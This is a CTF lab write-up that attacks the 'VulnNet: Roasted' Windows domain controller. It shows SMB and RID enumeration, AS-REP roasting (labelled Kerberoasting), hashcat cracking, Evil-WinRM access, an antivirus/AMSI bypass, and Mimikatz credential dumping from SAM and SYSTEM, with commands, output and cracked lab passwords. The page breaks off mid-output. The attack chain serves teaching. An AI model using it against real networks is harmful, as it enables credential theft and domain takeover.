<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" as="image" href="/avatar.jpg"/><link rel="stylesheet" href="/_next/static/css/f194b09a73f2e100.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-97a4f47456697fca.js"/><script src="/_next/static/chunks/4bd1b696-4042c1d6d7e15b27.js" async=""></script><script src="/_next/static/chunks/1517-4ce464ed9da3a640.js" async=""></script><script src="/_next/static/chunks/main-app-59d47cb7e6ea11f6.js" async=""></script><script src="/_next/static/chunks/4bd22374-385178446340ab50.js" async=""></script><script src="/_next/static/chunks/8173-a0231b583aa8a812.js" async=""></script><script src="/_next/static/chunks/8541-83b6253cc9a1a19d.js" async=""></script><script src="/_next/static/chunks/5699-d5e6aa1c7bb352a9.js" async=""></script><script src="/_next/static/chunks/app/cyber/writeup/vulnet-roasted/page-3cd23d5d87384809.js" async=""></script><link rel="icon" href="/avatar.jpg"/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body><div class="Wrapper"><div><div class="burger-menu">☰ <!-- -->            </div><div class="sidebarLeft "><div class="avatar"><img src="/avatar.jpg" alt="Avatar"/></div><ul><a href="/"><li>Search</li></a><a href="/cyber/writeup"><li>Writeups</li></a><a href="/cyber/blog"><li>Blog</li></a><a href="/cyber/tags"><li>Tags</li></a><a href=""><li style="color:#555555">Resources</li></a><a href="/cyber/cheat-sheet"><li>Cheat sheets</li></a></ul></div></div><div class="content"><div class="Post"><div><div id="Vulnet:-Roasted"><div><h1> <span style="color:#da1953">Vuln</span>et: Roasted</h1><hr></div><div id="banner"><div><img src="/cyber/writeup/vulnet-roasted/banner.gif" alt=""></div><div><p>To complete this box, I had to rely on write-ups. If you are here for the same reason, remember that it is totally fine to rely on write-ups as long as you learn something new. This was also one of my first Windows Domain Controller box.</p></div></div><div id="Scanning"><div><hr><h1><span style="color:#da1953">Sca</span>nning</h1></div><div><p><pre>$ nmap -sC -sV -oN nmap-scan 10.10.79.27     <br>Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 13:32 EDT<br>Nmap scan report for vulnnet-rst.local (10.10.79.27)<br>Host is up (0.054s latency).<br>Not shown: 990 filtered tcp ports (no-response)<br>PORT     STATE SERVICE       VERSION<br>53/tcp   open  domain        Simple DNS Plus<br>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-27 17:35:32Z)<br>135/tcp  open  msrpc         Microsoft Windows RPC<br>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)<br>445/tcp  open  microsoft-ds?<br>464/tcp  open  kpasswd5?<br>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)<br>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled and required<br>| smb2-time: <br>|   date: 2025-10-27T17:35:38<br>|_  start_date: N/A<br>|_clock-skew: -1s<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 199.22 seconds</pre></p></div><div><p>I have 10 open ports: 53/tcp DNS, 88/tcp kerberos-sec, 135/tcp msrpc, 139/tcp netbios-ssn, 389/tcp ldap, 445/tcp microsoft-ds?, 464/tcp kpasswd5?, 593/tcp ncacn_http, 3268/tcp ldap, 5985/tcp http</p></div><div id="Setup-/etc/hosts"><div><h2>Setup /etc/hosts</h2></div><div><p>The Nmap scan revealed the domain for this machine (vulnnet-rst.local), and I updated the host file with it.</p></div><div><p><pre>$ cat /etc/hosts                                                  <br>127.0.0.1       localhost<br>127.0.1.1       kali<br>10.10.79.27     vulnnet-rst.local<br><br># The following lines are desirable for IPv6 capable hosts<br>::1     localhost ip6-localhost ip6-loopback<br>ff02::1 ip6-allnodes<br>ff02::2 ip6-allrouters</pre></p></div><div><p>This is often done because because many HTB/THM (and other CTF) targets host multiple services or virtual hosts on the same IP and those services expect a particular hostname (Host header / SNI / Kerberos SPN). Adding an entry to /etc/hosts (or the OS hosts file) makes your machine resolve that hostname to the target IP so requests look authentic to the server.</p></div></div></div><div id="Enumeration"><div><h1><span style="color:#da1953">Enu</span>meration</h1></div><div id="SMB-Anonymous-Login"><div><h2>SMB Anonymous Login</h2></div><div><p>The first thing I did was to enumerate SMB with anonymous login, which is a common step in AD enumeration. When prompted to enter the password, just press enter without a password.</p></div><div><p><pre>$ netexec smb 10.10.79.27 -u 'anythingyouwant' -p '' --shares<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)                                                                                                                                                         <br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\anythingyouwant: (Guest)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  [*] Enumerated shares<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  Share           Permissions     Remark&lt;br&gt;SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  -----           -----------     ------<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  C$                              Default share<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  NETLOGON                        Logon server share <br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  SYSVOL                          Logon server share <br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing<br></pre></p></div><div><p>By accessing the shares where I have read permission, I found many notes, including some names and surnames, and I assumed they are users of the systems. Maybe not all of them, but a few may be users of the systems.</p></div><div><p><pre>$ smbclient '\\10.10.79.27\VulnNet-Business-Anonymous'   <br>Password for [WORKGROUP\kali]:<br>Try "help" to get a list of possible commands.<br>smb: \> ls<br>  .                                   D        0  Fri Mar 12 21:46:40 2021<br>  ..                                  D        0  Fri Mar 12 21:46:40 2021<br>  Business-Manager.txt                A      758  Thu Mar 11 20:24:34 2021<br>  Business-Sections.txt               A      654  Thu Mar 11 20:24:34 2021<br>  Business-Tracking.txt               A      471  Thu Mar 11 20:24:34 2021<br><br>                8771839 blocks of size 4096. 4524479 blocks available</pre></p></div><div><p><pre>$ smbclient '\10.10.79.27\VulnNet-Enterprise-Anonymous'<br>Password for [WORKGROUP\kali]:<br>Try "help" to get a list of possible commands.<br>smb: \> ls<br>  .                                   D        0  Fri Mar 12 21:46:40 2021<br>  ..                                  D        0  Fri Mar 12 21:46:40 2021<br>  Enterprise-Operations.txt           A      467  Thu Mar 11 20:24:34 2021<br>  Enterprise-Safety.txt               A      503  Thu Mar 11 20:24:34 2021<br>  Enterprise-Sync.txt                 A      496  Thu Mar 11 20:24:34 2021<br><br>                8771839 blocks of size 4096. 4522959 blocks available<br></pre></p></div><div><p><pre>$ smbclient '\10.10.79.27\IPC$'<br>Password for [WORKGROUP\kali]:<br>Try "help" to get a list of possible commands.<br>smb: \> ls<br>NT_STATUS_NO_SUCH_FILE listing \*</pre></p></div><div><p>The problem with the usernames I obtained is that I do not know how they are registered in the system. They could be in one of these formats:<i><ul><li>namesurname</li><li>surnamename</li><li>name.surname</li><li>surname.name</li></ul></i>etc.</p></div><div><p>I have manually crafted a list of possible formats and tried to enumate the SMB shares, but my list of usernames did not work. So I have to find another way to enumerate the users.</p></div></div><div id="RID-Bruteforce"><div><h2>RID Bruteforce</h2></div><div><p>Another way to enumerate users is the RID Bruceforcing. But before doing it, let's see what it is and why it works.</p></div><div id="What-RID-Bruteforce?"><div><h3>What is a RID (and a SID)?</h3></div><div><p>A SID (Security Identifier) is Windows’ unique identifier for accounts (users, groups, computers). It looks like <pre>S-1-5-21- &lt; DOMAIN-IDENTIFIERS &gt; - &lt; RID &gt;</pre></p></div><div><p>The RID (Relative Identifier) is the final numeric part of the SID (the last dash number). It distinguishes an account inside a domain or local machine. Example: <i>S-1-5-21-1111111111-2222222222-3333333333-500</i> and 500 is the RID (historically the local Administrator account).</p></div><div><p>If you can connect with an anonymous SMB session, the domain/machine SID (the S-1-5-21-... prefix) often appears in metadata the server exposes — most commonly inside security descriptors (ACLs/SDDL) on shares or files, in permission strings, or embedded in readable system files (registry hives, config files) stored on accessible shares. Inspecting ACLs / security descriptors and any readable system/config files is the most reliable, non-intrusive way to obtain the SID prefix.</p></div><div><p>Often, the guest SMB account has the following SID (not always), which can be used as a starting SID to brute-force the RID and enumerate accounts. <pre>S-1-5-21-1111111111-222222222-333333333-501</pre></p></div><div><p>501 is the well-known RID for the built-in Guest account on Windows</p></div><div><p></p></div></div><div id="How-the-attack-workds?"><div><h3>How the attack works?</h3></div><div>There are standard Windows APIs and directory/protocol behaviors that map SIDs to human-readable names or return information about whether an account exists:<ul><li>Directory services (LDAP / Active Directory) can be queried for <code>objectSid</code> attributes.</li><li>Local/remote APIs (for example, name-translation APIs exposed by the OS) can ask “who is this SID?” and the server will return either the mapped name or an error/“not found”.</li><li>Some protocol responses include security descriptors (SDDL) or ACEs that contain SIDs; parsing those reveals which SIDs are present.</li></ul></div><div><p>Possible server responses (conceptual):<ul><li>Exists → returns name/metadata. The server maps the SID and returns the account name and possibly other attributes.</li><li>Doesn't exist → “no mapping”/not found. No account corresponds to that RID under that prefix.</li><li>Permission denied / blocked / no reply. The server refuses to disclose or requires auth good from a defensive view.</li></ul></p></div></div><div><p>Now that the mystery behind RID bruteforcing has been solved, I will proceed with the RID bruteforcing.</p></div><div><p><pre>$ nxc smb 10.10.79.27 -u 'anonymous' -p '' --rid-brute<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)                                                                                                                                                         <br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\anonymous: (Guest)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  500: VULNNET-RST\Administrator (SidTypeUser)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  501: VULNNET-RST\Guest (SidTypeUser)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  502: VULNNET-RST\krbtgt (SidTypeUser)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  512: VULNNET-RST\Domain Admins (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  513: VULNNET-RST\Domain Users (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  514: VULNNET-RST\Domain Guests (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  515: VULNNET-RST\Domain Computers (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  516: VULNNET-RST\Domain Controllers (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  517: VULNNET-RST\Cert Publishers (SidTypeAlias)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  518: VULNNET-RST\Schema Admins (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  519: VULNNET-RST\Enterprise Admins (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  525: VULNNET-RST\Protected Users (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  526: VULNNET-RST\Key Admins (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  1101: VULNNET-RST\DnsAdmins (SidTypeAlias)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  1105: VULNNET-RST\a-whitehat (SidTypeUser)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  1109: VULNNET-RST\t-skid (SidTypeUser)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  1110: VULNNET-RST\j-goldenhand (SidTypeUser)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  1111: VULNNET-RST\j-leet (SidTypeUser)<br></pre></p></div><div><p>The tool extracted the following users:<ul><li>a-whitehat</li><li>j-goldenhand</li><li>t-skid</li><li>j-leet</li></ul><br>I also saved them in a file to use as a wordlist later.</p></div></div></div><div id="Kerberoasting"><div><h1><span style="color:#da1953">Ker</span>beroasting</h1></div><div>Among the various attacks, Kerberoasting seemed the most plausible to me, also the name of the challene sugests it. I had to rely on writeups as I didnt know what tool to use and how to implement the attack atought I knew the logic behind the attack and how the Kerberos authentication protocol works.</div><div><p>GetUserSPNs (tool to implement Kerberoasting) automates two things: (1) finding accounts in Active Directory that are associated with service principal names (SPNs), and (2) asking the Kerberos service for service tickets for those SPNs. The returned service ticket is encrypted with a key derived from the service account’s password. That encrypted ticket can be extracted and attacked offline to recover the service account password (or its equivalent key material). This general technique is called Kerberoasting (and is conceptually similar to AS-REP roasting for accounts without Kerberos pre-authentication).</p></div><div><p><pre>$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py vulnnet-rst.local/ -no-pass -usersfile ./users<br>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies <br><br>[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set<br>[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set<br>$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:8ac208a2af70d6a2bac58fa5cc64103c$89c4fbc54e61730ea6f6769e9dbf8171b980423f815196d77d879a91400ef773d<br>904894d3b9611e42c47e6ab7a5a087628248c14696c1d9431f32d7f75ca54e6be714934653583e1baee45089451f7b2bb95ccfd01e83cddb1d2b6149229b6e2d414116b1a<br>132bcb621399a4894745cbb0f2a59102da0b6d7152c3cf6345d270aef22dd7a8687d2a241db586a33330b58808857db25b14c4edbff2d6397905e63f9585534499779ea54<br>52c790ee9aff1598ea5d41f6360493ad8e801aab5ccb3eca4bbddae15d3a079d5cc949ab4b67bb968bb2cd7a4f892cd5b4d36268dc0f6cec6fba8eafb0f02db93000d1864<br>135c9a4ee7df501f<br>[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set</pre></p></div><div><p>The attack successfully completed and found <i>t-skid</i> hash. I can crack it with JTR or Hashcat.</p></div></div><div id="Hash-Cracking"><div><h1><span style="color:#da1953">Has</span>h Cracking</h1></div><div><p>The next step will be saving the hash in a file and cracking it with hashcat.</p></div><div><p><img src="/cyber/writeup/vulnet-roasted/hash.JPG" alt=""></p></div><div><p><pre>$ hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt.gz <br>hashcat (v6.2.6) starting<br><br>OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]<br>====================================================================================================================================================<br>* Device #1: cpu-haswell-Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, 1424/2912 MB (512 MB allocatable), 4MCU<br><br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 256<br><br>Hashes: 1 digests; 1 unique digests, 1 unique salts<br>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br>Rules: 1<br><br>Optimizers applied:<br>* Zero-Byte<br>* Not-Iterated<br>* Single-Hash<br>* Single-Salt<br><br>ATTENTION! Pure (unoptimized) backend kernels selected.<br>Pure kernels can crack longer passwords, but drastically reduce performance.<br>If you want to switch to optimized kernels, append -O to your commandline.<br>See the above message to find out about the exact limits.<br><br>Watchdog: Temperature abort trigger set to 90c<br><br>Host memory required for this attack: 0 MB<br><br>Dictionary cache hit:<br>* Filename..: /usr/share/wordlists/rockyou.txt.gz<br>* Passwords.: 14344385<br>* Bytes.....: 53357329<br>* Keyspace..: 14344385<br><br>$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:8ac208a2af70d6a2bac58fa5cc64103c$89c4fbc54e61730ea6f6769e9dbf8171b980423f815196d77d879a91400ef773d<br>904894d3b9611e42c47e6ab7a5a087628248c14696c1d9431f32d7f75ca54e6be714934653583e1baee45089451f7b2bb95ccfd01e83cddb1d2b6149229b6e2d414116b1a<br>132bcb621399a4894745cbb0f2a59102da0b6d7152c3cf6345d270aef22dd7a8687d2a241db586a33330b58808857db25b14c4edbff2d6397905e63f9585534499779ea54<br>52c790ee9aff1598ea5d41f6360493ad8e801aab5ccb3eca4bbddae15d3a079d5cc949ab4b67bb968bb2cd7a4f892cd5b4d36268dc0f6cec6fba8eafb0f02db93000d1864<br>135c9a4ee7df501f:<code>tj072889*</code><br>                                                          <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)<br>Hash.Target......: $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:8ac208a2af70...df501f<br>Time.Started.....: Tue Oct 28 08:00:55 2025 (2 secs)<br>Time.Estimated...: Tue Oct 28 08:00:57 2025 (0 secs)<br>Kernel.Feature...: Pure Kernel<br>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)<br>Guess.Queue......: 1/1 (100.00%)<br>Speed.#1.........:  1307.8 kH/s (0.53ms) @ Accel:256 Loops:1 Thr:1 Vec:8<br>Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)<br>Progress.........: 3178496/14344385 (22.16%)<br>Rejected.........: 0/3178496 (0.00%)<br>Restore.Point....: 3177472/14344385 (22.15%)<br>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1<br>Candidate.Engine.: Device Generator<br>Candidates.#1....: tjamaalb -> tj030499<br>Hardware.Mon.#1..: Util: 63%<br><br>Started: Tue Oct 28 08:00:51 2025<br>Stopped: Tue Oct 28 08:00:59 2025</pre></p></div><div><p>Alternatively, it is also possible to use the following variation of the same command to extract and share the hash in a file formatted for hashcat.</p></div><div><p><pre>$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -usersfile ./users -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.10.208.134 'vulnnet-rst.local/'<br>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies <br><br>[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set<br>[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set<br>$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:92fc9dbb95a6c7146027c7de371b7f61$ecad3cc8207ad3a434a66a6890525679bca9370d938d3aacd5a640e28f9a3a9ca<br>c7d756ea8a5c5f3f7a26149b92c94078278de24c0cf516d822e577852bd03169aa88e87bcdd640f48e7b831984c47a5e68cf62014efacf734388a2532bb312ee493097cc5<br>055318f7422e278a8d3322d89aaeedb113ad07270d63de6e2d965b486975c300b67d6ed0bc2a260d49caddaaf3f3bb419161992a1d3c3ae92123fe26dee682c98266f4e86<br>04a524ab40d81cf01c7e332aee6c4a65a509362e25a3b8875bee5a743e95cbc9649fa8833bf35a2e0c621c5673c2f3c61924ca3136cd4753460c0e940d381c89f36a86ac1<br>02ccae8c5778113a<br>[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set</pre></p></div><div><p>At this point, I have valid credentials for a user. I can now re-start my whole enumeration process same steps that have been done so far.</p></div></div><div id="Authenticated-SMB-Enumeration"><div><h1> <span style="color:#da1953">Aut</span>henticated SMB Enumeration</h1></div><div><p>Connecting to SMB again, but this time with a user credential may give access to more shares.</p></div><div><p><pre>$ netexec smb 10.10.208.134 -u 't-skid' -p 'tj072889*' --shares      <br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)                                                                                                                                                         <br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local	-skid:tj072889* <br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  [*] Enumerated shares<br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  Share           Permissions     Remark<br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  -----           -----------     ------<br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin<br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  C$                              Default share<br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC<br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  NETLOGON        READ            Logon server share <br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  SYSVOL          READ            Logon server share <br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing<br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing</pre></p></div><div><p>Now I have additional access to the following shares: <b>IPC$</b>, <b>NETLOGON</b> and <b>SYSVOL</b>.</p></div><div id="Accessing-Shares-as-T-Skid"><div><h2>Accessing Shares as T-Skid</h2></div><div><p><pre>$ smbclient '\\10.10.232.121\IPC$' -U vulnnet-rst/t-skid<br>Password for [VULNNET-RST\t-skid]:<br>Try "help" to get a list of possible commands.<br>smb: \> ls<br>NT_STATUS_NO_SUCH_FILE listing \*</pre></p></div><div><p>The <b>IPC$</b> share needs elevated privilege to list the file. Can’t access it with this user's credentials; other users may have permission to list the files.</p></div><div><p><pre>$ smbclient '\\10.10.232.121\NETLOGON' -U vulnnet-rst/t-skid<br>Password for [VULNNET-RST\t-skid]:<br>Try "help" to get a list of possible commands.<br>smb: \> ls<br>  .                                   D        0  Tue Mar 16 19:15:49 2021<br>  ..                                  D        0  Tue Mar 16 19:15:49 2021<br>  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021<br><br>                8771839 blocks of size 4096. 4537990 blocks available<br>smb: \> get ResetPassword.vbs <br>getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)</pre></p></div><div><p>The <b>NETLOGON</b> share exposes a VisualBasic script, which I can download and inspect. I can clearly see a credential of another user that I previously enumerated.</p></div><div><p><img src="/cyber/writeup/vulnet-roasted/vbscript.JPG" alt=""></p></div><div><p></p></div></div><div id="Accessing-Shares-as-A-Whitehat"><div><h2>Accessing Shares as A-Whitehat</h2></div><div><p><pre>netexec smb 10.10.232.121 -u 'a-whitehat' -p 'bNdKVkjv3RR9ht' --shares<br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)                                                                                                                                                         <br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)<br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  [*] Enumerated shares<br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  Share           Permissions     Remark<br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  -----           -----------     ------<br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  ADMIN$          READ,WRITE      Remote Admin<br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  C$              READ,WRITE      Default share<br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC<br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  NETLOGON        READ,WRITE      Logon server share <br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  SYSVOL          READ,WRITE      Logon server share <br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing<br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing</pre></p></div><div><p>The script says Powned! It means this user is an admin and has all the privileges. It is also confirmed by the READ and WRITE privileges this user has on all the shares. At this point, with a lot of patience, I have enumerated all the shares; it took me like 1h or more. At the end, I found the user flag in <i>\Users\enterprise-core-vn\Desktop\</i></p></div><div><p><img src="/cyber/writeup/vulnet-roasted/userflag.JPG" alt=""></p></div></div></div><div id="Remote-access-with-Evil-WinRM-as-A-Whitehat"><div><h1><span style="color:#da1953">Rem</span>ote access with Evil-WinRM as A-Whitehat</h1></div><div><p>With the SMB share, I am limited in operations. Port 5985 is open, which is the WinRM  with Evil-WinRM. It is the equivalent of the SSH service on Linux.</p></div><div><p><pre>$ evil-winrm -u a-whitehat -p bNdKVkjv3RR9ht -i 10.10.56.192 -s /usr/share/powershell-empire/empire/server/data/module_source/credentials/<br>                                        <br>Evil-WinRM shell v3.7<br>                                        <br>Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline<br>                                        <br>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion<br>                                        <br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\Users\a-whitehat\Documents> whoami<br>vulnnet-rst\a-whitehat</pre></p></div><div><p>Note that the command was launched with the flag <b>-s</b>, which indicates the location of my scripts I want to load from my Kali machine, where <i>Invoke-Mimikatz.ps1</i> is located.</p></div><div><p><img src="/cyber/writeup/vulnet-roasted/adminpriv.JPG" alt=""></p></div></div><div id="Extract-Admin-NTLM"><div><h1><span style="color:#da1953">Ext</span>act SAM file</h1></div><div id="Bypass-antivirus-(Bypass-4msi)"><div><h2>Bypass antivirus (Bypass-4msi)</h2></div><div><p>To extract the SAM file, first, I need to bypass the antivirus; otherwise, Mimikatz will not work and will be blocked.</p></div><div><p><pre>*Evil-WinRM* PS C:\Windows\System32\config> Bypass-4MSI<br>                                        <br>Info: Patching 4MSI, please be patient...<br>                                        <br>[+] Success!<br>                                        <br>Info: Patching ETW, please be patient ..<br>                                        <br>[+] Success!</pre></p></div></div><div id="Copying-SAM-and-SYSTEM"><div><h2>Copying SAM and SYSTEM</h2></div><div><p>To extract the SAM file and the Administrator NTLM hash, I can use the SAM file directly from <i>C:/Windows/Syste32/config/SAM</i> because to extract the hash from SAM, I also need the SYSTEM file. While the operating system is in execution, I cannot access the SYSTEM file. To circumvent this problem, I made a local copy of those file and saved in the current user's desktop. </p></div><div><p><pre>*Evil-WinRM* PS C:\Users\a-whitehat\Desktop> reg save HKLM\SYSTEM C:\Users\a-whitehat\Desktop\system.save<br>The operation completed successfully.<br><br>*Evil-WinRM* PS C:\Users\a-whitehat\Desktop> reg save HKLM\SAM C:\Users\a-whitehat\Desktop\sam.save<br>The operation completed successfully.<br><br>*Evil-WinRM* PS C:\Users\a-whitehat\Desktop> ls<br><br><br>    Directory: C:\Users\a-whitehat\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----       10/31/2025   1:58 PM          49152 sam.save<br>-a----       10/31/2025   1:58 PM       16433152 system.save</pre></p></div></div><div id="Extract-Administrator-NTLM-hash"><div><h2>Extract Administrator NTLM hash</h2></div><div><p>To extract the Administrator NTLM hash, I can use my local copy of SAM and SYSTEM. I use the command line argument for Mimikatz and provide the local paths.</p></div><div><p><pre>*Evil-WinRM* PS C:\Users\a-whitehat\Desktop> Invoke-Mimikatz -Command '"lsadump::sam /system:C:\Users\a-whitehat\Desktop\system.save /SAM:C:\Users\a-whitehat\Desktop\sam.save"'<br>Hostname: 